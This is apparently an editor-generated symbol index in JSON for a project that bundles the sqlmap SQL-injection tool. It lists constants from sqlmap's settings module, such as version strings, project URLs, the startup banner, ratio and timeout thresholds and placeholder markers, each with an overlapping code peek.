        "peekOfCode": "TYPE_COLORS = {\"dev\": 33, \"stable\": 90, \"pip\": 34}\nVERSION_STRING = \"sqlmap/%s#%s\" % ('.'.join(VERSION.split('.')[:-1]) if VERSION.count('.') > 2 and VERSION.split('.')[-1] == '0' else VERSION, TYPE)\nDESCRIPTION = \"automatic SQL injection and database takeover tool\"\nSITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VERSION_STRING = \"sqlmap/%s#%s\" % ('.'.join(VERSION.split('.')[:-1]) if VERSION.count('.') > 2 and VERSION.split('.')[-1] == '0' else VERSION, TYPE)\nDESCRIPTION = \"automatic SQL injection and database takeover tool\"\nSITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DESCRIPTION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DESCRIPTION = \"automatic SQL injection and database takeover tool\"\nSITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SITE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_USER_AGENT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEV_EMAIL_ADDRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ISSUES_PAGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GIT_REPOSITORY",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m\n|_ -| . [.]     | .'| . |",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GIT_PAGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"\nWIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WIKI_PAGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "WIKI_PAGE = \"https://github.com/sqlmapproject/sqlmap/wiki/\"\nZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   \\033[0m\\033[4;37m%s\\033[0m\\n",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ZIPBALL_PAGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ZIPBALL_PAGE = \"https://github.com/sqlmapproject/sqlmap/zipball/master\"\n# colorful banner\nBANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   \\033[0m\\033[4;37m%s\\033[0m\\n\n\"\"\" % (TYPE_COLORS.get(TYPE, 31), VERSION_STRING.split('/')[-1], SITE)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BANNER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BANNER = \"\"\"\\033[01;33m\\\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  \\033[01;37m{\\033[01;%dm%s\\033[01;37m}\\033[01;33m\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   \\033[0m\\033[4;37m%s\\033[0m\\n\n\"\"\" % (TYPE_COLORS.get(TYPE, 31), VERSION_STRING.split('/')[-1], SITE)\n# Minimum distance of ratio from kb.matchRatio to result in True\nDIFF_TOLERANCE = 0.05",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DIFF_TOLERANCE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DIFF_TOLERANCE = 0.05\nCONSTANT_RATIO = 0.9\n# Ratio used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_RATIO = 0.5\n# Timeout used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_TIMEOUT = 10\n# Timeout used in checking for existence of live-cookies file\nLIVE_COOKIES_TIMEOUT = 120\n# Lower and upper values for match ratio in case of stable page\nLOWER_RATIO_BOUND = 0.02",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CONSTANT_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CONSTANT_RATIO = 0.9\n# Ratio used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_RATIO = 0.5\n# Timeout used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_TIMEOUT = 10\n# Timeout used in checking for existence of live-cookies file\nLIVE_COOKIES_TIMEOUT = 120\n# Lower and upper values for match ratio in case of stable page\nLOWER_RATIO_BOUND = 0.02\nUPPER_RATIO_BOUND = 0.98",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IPS_WAF_CHECK_RATIO = 0.5\n# Timeout used in heuristic check for WAF/IPS protected targets\nIPS_WAF_CHECK_TIMEOUT = 10\n# Timeout used in checking for existence of live-cookies file\nLIVE_COOKIES_TIMEOUT = 120\n# Lower and upper values for match ratio in case of stable page\nLOWER_RATIO_BOUND = 0.02\nUPPER_RATIO_BOUND = 0.98\n# Markers for special cases when parameter values contain html encoded characters\nPARAMETER_AMP_MARKER = \"__AMP__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IPS_WAF_CHECK_TIMEOUT = 10\n# Timeout used in checking for existence of live-cookies file\nLIVE_COOKIES_TIMEOUT = 120\n# Lower and upper values for match ratio in case of stable page\nLOWER_RATIO_BOUND = 0.02\nUPPER_RATIO_BOUND = 0.98\n# Markers for special cases when parameter values contain html encoded characters\nPARAMETER_AMP_MARKER = \"__AMP__\"\nPARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LIVE_COOKIES_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LIVE_COOKIES_TIMEOUT = 120\n# Lower and upper values for match ratio in case of stable page\nLOWER_RATIO_BOUND = 0.02\nUPPER_RATIO_BOUND = 0.98\n# Markers for special cases when parameter values contain html encoded characters\nPARAMETER_AMP_MARKER = \"__AMP__\"\nPARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOWER_RATIO_BOUND",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LOWER_RATIO_BOUND = 0.02\nUPPER_RATIO_BOUND = 0.98\n# Markers for special cases when parameter values contain html encoded characters\nPARAMETER_AMP_MARKER = \"__AMP__\"\nPARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UPPER_RATIO_BOUND",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UPPER_RATIO_BOUND = 0.98\n# Markers for special cases when parameter values contain html encoded characters\nPARAMETER_AMP_MARKER = \"__AMP__\"\nPARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_AMP_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARAMETER_AMP_MARKER = \"__AMP__\"\nPARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_SEMICOLON_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARAMETER_SEMICOLON_MARKER = \"__SEMICOLON__\"\nBOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDARY_BACKSLASH_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BOUNDARY_BACKSLASH_MARKER = \"__BACKSLASH__\"\nPARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_PERCENTAGE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARAMETER_PERCENTAGE_MARKER = \"__PERCENTAGE__\"\nPARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_VALUE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARTIAL_VALUE_MARKER = \"__PARTIAL_VALUE__\"\nPARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARTIAL_HEX_VALUE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARTIAL_HEX_VALUE_MARKER = \"__PARTIAL_HEX_VALUE__\"\nURI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_QUESTION_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "URI_QUESTION_MARKER = \"__QUESTION__\"\nASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ASTERISK_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ASTERISK_MARKER = \"__ASTERISK__\"\nREPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REPLACEMENT_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REPLACEMENT_MARKER = \"__REPLACEMENT__\"\nBOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDED_BASE64_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BOUNDED_BASE64_MARKER = \"__BOUNDED_BASE64__\"\nBOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOUNDED_INJECTION_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BOUNDED_INJECTION_MARKER = \"__BOUNDED_INJECTION__\"\nSAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SAFE_VARIABLE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SAFE_VARIABLE_MARKER = \"__SAFE__\"\nSAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SAFE_HEX_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SAFE_HEX_MARKER = \"__SAFE_HEX__\"\nDOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DOLLAR_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DOLLAR_MARKER = \"__DOLLAR__\"\nRANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOM_INTEGER_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
